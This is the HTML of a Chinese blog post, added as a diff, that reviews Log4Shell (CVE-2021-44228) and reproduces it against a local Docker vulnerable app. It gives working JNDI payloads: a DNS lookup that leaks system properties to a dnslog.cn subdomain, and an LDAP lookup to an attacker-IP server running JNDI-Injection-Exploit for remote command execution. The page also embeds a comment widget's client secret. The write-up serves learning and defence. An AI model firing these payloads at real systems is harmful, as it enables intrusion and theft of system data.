@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans" prefix="og: http://ogp.me/ns#" class="han-init">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <title>log4j2漏洞学习 &mdash; 老实记</title>
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/collection.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/repo-card.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/sections/repo-list.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/sections/mini-repo-list.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/boxed-group.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/common.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/share.js/dist/css/share.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/responsive.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/posts/index.css">
+    <!-- Latest compiled and minified CSS -->
+    
+
+    
+    <link rel="canonical" href="http://localhost:4000/2023/09/17/log4shell/">
+    <link rel="alternate" type="application/atom+xml" title="老实记" href="http://localhost:4000/feed.xml">
+    <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+    
+    <meta property="og:title" content="log4j2漏洞学习">
+      
+    <meta name="keywords" content="Stone, shidongwa, shidonghua, 石东华">
+    <meta name="og:keywords" content="Stone, shidongwa, shidonghua, 石东华">
+      
+    <meta name="description" content="Log4Shell漏洞分析和复现">
+    <meta name="og:description" content="Log4Shell漏洞分析和复现">
+      
+    
+    
+        
+    
+    <meta property="og:url" content="http://localhost:4000/2023/09/17/log4shell/">
+    <meta property="og:site_name" content="老实记">
+    <meta property="og:type" content="article">
+    <meta property="og:locale" content="zh_CN" />
+    
+    <meta property="article:published_time" content="2023-09-17">
+    
+    <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
+    <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
+    <script type="text/javascript">
+    function toggleMenu() {
+        var nav = document.getElementsByClassName("site-header-nav")[0];
+        if (nav.style.display == "inline-flex") {
+          nav.style.display = "none";
+        } else {
+          nav.style.display = "inline-flex";
+        }
+    }
+    </script>
+    <!-- clarity.microsoft -->
+    <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "rxv5n7dp1c");
+  </script>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-E5PQNHM9S3"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-E5PQNHM9S3');
+  </script>
+  
+</head>
+<body class="" data-mz="">
+    <header class="site-header">
+        <div class="container">
+            <h1><a href="http://localhost:4000/" title="老实记"><span class="octicon octicon-mark-github"></span> 老实记</a></h1>
+            <button class="collapsed mobile-visible" type="button" onclick="toggleMenu();">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <nav class="site-header-nav" role="navigation">
+                
+                <a href="http://localhost:4000/" class=" site-header-nav-item" target="" title="首页">首页</a>
+                
+                <a href="http://localhost:4000/categories/" class=" site-header-nav-item" target="" title="分类">分类</a>
+                
+                <a href="http://localhost:4000/archives/" class=" site-header-nav-item" target="" title="归档">归档</a>
+                
+                <a href="http://localhost:4000/wiki/" class=" site-header-nav-item" target="" title="维基">维基</a>
+                
+                <a href="http://localhost:4000/links/" class=" site-header-nav-item" target="" title="链接">链接</a>
+                
+                <a href="http://localhost:4000/about/" class=" site-header-nav-item" target="" title="关于">关于</a>
+                
+            </nav>
+        </div>
+    </header>
+    <!-- / header -->
+
+    <section class="collection-head small geopattern" data-pattern-id="log4j2漏洞学习">
+<div class="container">
+  <div class="columns">
+    <div class="column three-fourths">
+      <div class="collection-title">
+        <h1 class="collection-header">log4j2漏洞学习</h1>
+        <div class="collection-info">
+          
+          <span class="meta-info">
+            <span class="octicon octicon-calendar"></span> 2023/09/17
+          </span>
+          
+          
+          <span class="meta-info">
+            <span class="octicon octicon-file-directory"></span>
+            <a href="http://localhost:4000/categories/#漏洞分析" title="漏洞分析">漏洞分析</a>
+          </span>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+<!-- / .banner -->
+<section class="container content">
+<div class="columns">
+  <div class="column three-fourths" >
+    <article class="article-content markdown-body">
+    <h2 id="log4shell">Log4Shell漏洞分析和复现</h2>
+<h1 id="section">一、漏洞回顾</h1>
+<p>Log4Shell 漏洞最早是阿里巴巴安全研究员 Chen Zhaojun 早在 2021 年 12 月 10 日发布（早在 11 月 24 日已发现上报），漏洞编号<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a>。影响 log4j2 2.0-beta9 到 2.15.0 多个版本，攻击者利用 log4j2 写日志时注入 jndi lookup 链接并执行远程命令。鉴于 log4j2 在 Java 生态圈的广泛使用，该漏洞一发现就妥妥到零日漏洞，CVSS（Common Vulnerability Scoring System）评级系统中最严重的 10.</p>
+<p>不少同行一定对当初加班紧急修复该漏洞记忆犹新。修复过程中也一波三折，衍生了 CVE-2021-45046，CVE-2021-45105，CVE-2021-44832 等漏洞，最终在 log4j2 2.17.1 版本修复。</p>
+<h1 id="section-1">二、漏洞复现</h1>
+<p>本文主要基于最初的漏洞在 log4j2 2.14.1 版本进行复现。主要内容包括：</p>
+<ol>
+<li>通过 docker 容器复现漏洞应用</li>
+<li>通过 jndi dnslog 模拟带外攻击执行系统属性查询</li>
+<li>通过 jndi lookup 远程命令执行</li>
+</ol>
+<h2 id="section-2">2.1 复现漏洞应用</h2>
+<p>复现漏洞依赖 JDK 版本和 log4j2 版本，一般通过容器镜像来比较方便。从网上找了一个应用 fork 出来<a href="https://github.com/shidongwa/CVE-2021-44228-VULN-APP">漏洞应用</a>。</p>
+<ul>
+<li>JDK：8u102</li>
+<li>log4j2: 2.14.1</li>
+</ul>
+<p>运行应用有两种方式:</p>
+<p><strong><em>方式 1</em></strong></p>
+<pre><code>cd CVE-2021-44228-VULN-APP/
+docker build -t log4j-shell-poc .
+docker run -p 8082:8080 log4j-shell-poc
+</code></pre>
+<p><strong><em>方式 2</em></strong>（需要本地安装 Docker Desktop）</p>
+<pre><code>docker pull nu11secur1ty/log4j-vuln-application
+docker run  -p 8082:8080 nu11secur1ty/log4j-vuln-application
+</code></pre>
+<p>外部通过<code>http://localhost:8082/</code>来访问。显示如下：
+<img src="https://github.com/shidongwa/seesea2024.github.io/blob/master/images/2023/091701.png?raw=true" alt="" /></p>
+<h2 id="dnslog-">2.2 dnslog 攻击</h2>
+<p>利用 dnslog 可以进行一种 OOB(Out Of Band)攻击。这里所谓的<strong>带外</strong>指的是不同与原本的业务请求响应数据路径，比如这里的 DNS 请求路径。</p>
+<p>OOB 攻击依赖 DNS 泛域名解析。简单来说泛域名解析指的是*.t831at.dnslog.cn 都会解析到域名 t831at.dnslog.cn 上。通过查看 t831at.dnslog.cn 的域名解析日志就可以看到 dns 查询命令执行的结果。</p>
+<p>具体步骤如下：</p>
+<ol>
+<li>登陆<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li>
+<li>点击“Get SubDomain&quot;比如得到域名“t831at.dnslog.cn”</li>
+<li>在 2.1 部分部署的漏洞应用页面输入
+<ul>
+<li>Username: ${jndi:dns://${sys:java.version}.t831at.dnslog.cn}</li>
+<li>Password: password</li>
+</ul>
+</li>
+<li>在<a href="http://www.dnslog.cn/%E9%A1%B5%E9%9D%A2%E7%82%B9%E5%87%BB%E2%80%9CRefresh">http://www.dnslog.cn/页面点击“Refresh</a> Record&quot;。可以看到 1.8.0_102.t831at.dnslog.cn 中最前面的<code>1.8.0_102</code>就是漏洞应用的 JDK 版本。
+<img src="https://github.com/shidongwa/seesea2024.github.io/blob/master/images/2023/091702.png?raw=true" alt="" /></li>
+</ol>
+<p><code>sys:java.version</code>中<em>java.version</em>可以替换为操作系统名和版本，用户名和目录等系统环境信息。具体可以参考<a href="https://docs.oracle.com/javase/tutorial/deployment/doingMoreWithRIA/properties.html">系统属性</a></p>
+<p><img src="https://github.com/shidongwa/seesea2024.github.io/blob/master/images/2023/091703.png?raw=true" alt="" /></p>
+<p><img src="https://github.com/shidongwa/seesea2024.github.io/blob/master/images/2023/091704.png?raw=true" alt="" /></p>
+<h2 id="jndi-">jndi 命令执行</h2>
+<p>这里需要用到一个工具应用<a href="https://github.com/shidongwa/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>，这个应用会生成 jndi 远程服务，提供命令给漏洞应用来下载并在漏洞应用中执行。</p>
+<p>比如我们需要在漏洞应用中写入一个文件/tmp/success.txt。操作步骤如下：</p>
+<ol>
+<li>从 github 下载代码并构建启动服务</li>
+</ol>
+<pre><code>git clone git@github.com:shidongwa/JNDI-Injection-Exploit.git
+cd JNDI-Injection-Exploit.git
+mvn clean package
+cd target
+# 假设192.168.10.104是攻击者服务器ip
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/success.txt&quot; -A &quot;192.168.10.104&quot;
+</code></pre>
+<ol start="2">
+<li>我们是 java 8，从上面服务的启动日志中获取 jndi 服务地址<code>ldap://192.168.10.104:1389/5jqrji</code>。攻击 payload 是<code>${jndi:ldap://192.168.10.104:1389/5jqrji}</code></li>
+</ol>
+<p><img src="https://files.mdnice.com/user/48760/7716b228-7c70-4663-b7f9-c37560a46381.png" alt="" /></p>
+<ol start="3">
+<li>在 2.1 部分部署的漏洞应用页面输入
+<ul>
+<li>Username: ${jndi:ldap://192.168.10.104:1389/5jqrji}</li>
+<li>Password: password</li>
+</ul>
+</li>
+<li>在漏洞主机中验证/tmp/success.txt 确实已写入</li>
+</ol>
+<pre><code>docker container ls
+docker exec -it 95fc bash
+ls -al /tmp/success.txt
+</code></pre>
+<p><img src="https://files.mdnice.com/user/48760/c3b43b55-c4d6-4432-b297-59c2afda8e53.png" alt="" /></p>
+<p><img src="https://files.mdnice.com/user/48760/c8de128f-5999-4730-ac3d-f8e4b35b89dc.png" alt="" /></p>
+<h1 id="section-3">三、总结</h1>
+<p>通过对 log4j2 漏洞进行了回顾和复现，学习了 log4j2 jndi lookup 功能调用 ldap、dns 执行远程命令。对反弹 shell 和 rmi 等本文未涉及。</p>
+
+    </article>
+    <div class="share">
+      <div class="share-component"></div>
+    </div>
+    <div class="comment">
+      
+
+  
+
+  
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+        <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+        <script>
+        var gitalk = new Gitalk({
+            id: '/2023/09/17/log4shell/',
+            clientID: '2443c55823f977361bae',
+            clientSecret: 'ace39b2327a62f955b408d4197ff75fc946c8613',
+            repo: 'blog-comments',
+            owner: 'shidongwa',
+            admin: ['shidongwa'],
+            labels: ['gitment'],
+            perPage: 10,
+        })
+        gitalk.render('gitalk-container')
+        </script>
+  
+
+
+    </div>
+  </div>
+  <div class="column one-fourth">
+    
+<h3>Search</h3>
+<div id="site_search">
+    <input type="text" id="search_box" placeholder="Search">
+</div>
+
+<ul id="search_results"></ul>
+
+<link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/modules/sidebar-search.css">
+<script src="http://localhost:4000/assets/js/simple-jekyll-search.min.js"></script>
+<script src="http://localhost:4000/assets/js/search.js"></script>
+
+<script type="text/javascript">
+SimpleJekyllSearch({
+    searchInput: document.getElementById('search_box'),
+    resultsContainer: document.getElementById('search_results'),
+    json: 'http://localhost:4000/assets/search_data.json',
+    searchResultTemplate: '<li><a href="{url}" title="{desc}">{title}</a></li>',
+    noResultsText: 'No results found',
+    limit: 10,
+    fuzzy: false,
+    exclude: ['Welcome']
+})
+</script>
+
+    
+
+    
+<h3 class="post-directory-title mobile-hidden">Table of Contents</h3>
+<div id="post-directory-module" class="mobile-hidden">
+  <section class="post-directory">
+  <!-- Links that trigger the jumping -->
+  <!-- Added by javascript below -->
+  <dl></dl>
+  </section>
+</div>
+
+<script src="http://localhost:4000/assets/js/jquery.toc.js"></script>
+
+  </div>
+</div>
+</section>
+<!-- /section.content -->
+
+    <footer class="container">
+        <div class="site-footer" role="contentinfo">
+            <div class="copyright left mobile-block">
+                    © 2025
+                    <span title="Shi Donghua">Shi Donghua</span>
+                    <a href="javascript:window.scrollTo(0,0)" class="right mobile-visible">TOP</a>
+            </div>
+
+            <ul class="site-footer-links right mobile-hidden">
+                <li>
+                    <a href="javascript:window.scrollTo(0,0)" >TOP</a>
+                </li>
+            </ul>
+            <a href="https://github.com/shidongwa/shidongwa.github" target="_blank" aria-label="view source code">
+                <span class="mega-octicon octicon-mark-github" title="GitHub"></span>
+            </a>
+            <ul class="site-footer-links mobile-hidden">
+                
+                <li>
+                    <a href="http://localhost:4000/" title="首页" target="">首页</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/categories/" title="分类" target="">分类</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/archives/" title="归档" target="">归档</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/wiki/" title="维基" target="">维基</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/links/" title="链接" target="">链接</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/about/" title="关于" target="">关于</a>
+                </li>
+                
+                <li><a href="http://localhost:4000/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></li>
+            </ul>
+
+        </div>
+    </footer>
+    <!-- / footer -->
+    <script src="http://localhost:4000/assets/vendor/share.js/dist/js/share.min.js"></script>
+    <script src="http://localhost:4000/assets/js/geopattern.js"></script>
+    <script src="http://localhost:4000/assets/js/prism.js"></script>
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/prism.css">
+    <script>
+      jQuery(document).ready(function($) {
+        // geopattern
+        $('.geopattern').each(function(){
+          $(this).geopattern($(this).data('pattern-id'));
+        });
+       // hljs.initHighlightingOnLoad();
+      });
+    </script>
+
+    
+
+    
+
+    
+
+    
+
+    
+</body>
+</html>
